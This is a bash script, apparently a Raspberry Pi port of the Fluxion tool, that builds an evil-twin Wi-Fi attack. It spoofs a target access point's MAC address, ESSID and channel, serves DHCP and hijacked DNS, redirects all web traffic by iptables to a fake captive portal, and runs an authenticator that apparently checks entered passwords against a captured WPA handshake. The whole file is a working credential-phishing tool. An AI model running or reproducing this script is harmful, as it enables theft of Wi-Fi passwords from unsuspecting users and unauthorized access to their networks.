#!/bin/bash

while [ "$1" != "" ] && [ "$1" != "--" ]; do
	case "$1" in
		-m|--mac) MAC=$2; shift;;
		-e|--essid) ESSID=$2; shift;;
		-c|--channel) CHANNEL=$2; shift;;
		-h|--handshake) HANDSHAKE=$2; shift;;
		-i|--interface) INTERFACE=$2; shift;;
		-l|--language) LANGUAGE=$2; shift;;
	esac
	shift
done

shift

if [ "$MAC" == "" ] || [ "$INTERFACE" == "" ] || [ "$ESSID" == "" ] || [ "$CHANNEL" == "" ] || [ "$HANDSHAKE" == "" ]; then
	printf "You need to provide 5 arguments: -m MAC -e ESSID -c Channel -l Language (optional) -h 'path to handshake file' -i 'interface to use'.\n\nExample:\n./fluxpi.sh -m 'xx:xx:xx:xx:xx' -e 'AP ESSID' -c '6' -h '/root/network.cap' -l RS -i wlan0mon\n"
	exit
fi


	printf "Creating and copying .conf files\n"
	if [ -d "/tmp/fluxpi/" ]; then
		rm -r /tmp/fluxpi/
		rm /tmp/fluxpi/*
	fi

	mkdir /tmp/fluxpi
	mkdir /tmp/fluxpi/captive_portal
	openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "/tmp/fluxpi/server.pem" -out "/tmp/fluxpi/server.pem"
	chmod 400 "/tmp/fluxpi/server.pem"

		echo "\
interface=$INTERFACE
driver=nl80211
ssid=$ESSID
channel=$CHANNEL
hw_mode=g
auth_algs=1
wmm_enabled=0
\
" > "reqs/hostapd.conf"
	sleep 1
	cp -r reqs/* /tmp/fluxpi/
	if [ "$LANGUAGE" != "" ]; then
		rm "/tmp/fluxpi/captive_portal/index.html"
		cp "reqs/captive_portal/index_$LANGUAGE.html" "/tmp/fluxpi/captive_portal/index.html"
	else
		mv "/tmp/fluxpi/captive_portal/index_en.html" "/tmp/fluxpi/captive_portal/index.html"
	fi
	ip addr add 192.168.254.1/24 dev $INTERFACE
	cp $HANDSHAKE /tmp/fluxpi/network.cap
	ssid=$ESSID
	channel=$CHANNEL
	ifconfig $INTERFACE down
	sleep 1
	macchanger -m $MAC $INTERFACE
	sleep 1
	ifconfig $INTERFACE up
	sleep 1
	sed -i "s|%%SSID%%|$ESSID|g" /tmp/fluxpi/captive_portal/index.html
        sed -i "s|%%CHANNEL%%|$CHANNEL|g" /tmp/fluxpi/captive_portal/index.html
        sed -i "s|%%MAC%%|$MAC|g" /tmp/fluxpi/captive_portal/index.html
	touch /tmp/fluxpi/captive_portal/clients.txt
	touch /tmp/fluxpi/captive_portal/hit.txt
	# Activate system IPV4 packet routing/forwarding.
	sysctl -w net.ipv4.ip_forward=1 &>$INTERFACE

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.254.1:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.254.1:443
	iptables -A INPUT -p tcp --sport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE

	touch /tmp/fluxpi/dhcpd.leases


	printf "Starting Captive Portal\n"

	killall -9 lighttpd
	sleep 1
	killall -9 dhcpd
	sleep 1
	killall -9 hostapd

	sleep 1
	hostapd -B "/tmp/fluxpi/hostapd.conf" &
	sleep 1
	dhcpd -f -lf "/tmp/fluxpi/dhcpd.leases" -cf "/tmp/fluxpi/dhcpd.conf" $INTERFACE | tee -a "/tmp/fluxpi/captive_portal/clients.txt" &
	sleep 1
	chmod +x "/tmp/fluxpi/fluxion_captive_portal_dns.py"
	touch "/tmp/fluxpi/dns.log"
	sudo python "/tmp/fluxpi/fluxion_captive_portal_dns.py" > "/tmp/fluxpi/dns.log" &
	touch /tmp/fluxpi/lighttpd.log
	lighttpd -f /tmp/fluxpi/lighttpd.conf
	sleep 1
	chmod +x /tmp/fluxpi/captive_portal_authenticator.sh
	/tmp/fluxpi/captive_portal_authenticator.sh &
	printf "\n"
	read -p "Press [Enter] key to kill everything...\n"
	printf "\n"
	killall dhcpd
	killall lighttpd
	killall hostapd

	kill $(pgrep -f captive_portal_authenticator.sh)
	kill $(pgrep -f fluxion_captive_portal_dns.py)
